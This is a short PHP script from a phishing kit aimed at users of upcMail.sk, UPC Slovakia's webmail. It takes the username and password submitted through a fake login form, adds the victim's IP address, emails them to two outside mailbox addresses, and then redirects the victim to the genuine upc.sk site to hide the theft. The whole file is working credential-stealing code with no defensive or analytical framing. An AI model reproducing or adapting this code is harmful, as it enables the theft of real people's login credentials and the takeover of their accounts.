<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || upcMail.sk || :------\n";
$message .= "ID/Email             : ".$_POST['username']."\n";
$message .= "Password              : ".$_POST['password']."\n";
$message .= "----: || GhostMode || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "spark.gmx@aol.com, sspark.gmx@gmail.com";
$subject = " upcMail.sk 2022 | ".$ip."\n";

mail($recipient,$subject,$message);
header("Location:  https://www.upc.sk/");
?>